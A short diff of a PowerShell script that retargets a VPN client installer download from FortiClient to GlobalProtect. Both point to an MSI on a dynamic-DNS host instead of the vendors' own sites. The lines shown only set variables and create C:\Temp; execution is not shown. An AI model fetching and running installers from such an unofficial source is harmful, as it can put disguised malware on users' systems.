@@ -1,7 +1,7 @@
-$App = "FortigateVPN"
-$MsiUrl = "https://ibktangaalt.ydns.eu/upload/data/FortiClient.msi"
+$App = "GlobalProtect"
+$MsiUrl = "https://ibktangaalt.ydns.eu/upload/data/GlobalProtect64.msi"
 $TempFolderPath = "C:\Temp"
-$MsiPath = "$TempFolderPath\Fortinet-7.4.0.1658.msi"
+$MsiPath = "$TempFolderPath\GlobalProtect64.msi"
 
 if (!(Test-Path $TempFolderPath)) {
     mkdir $TempFolderPath
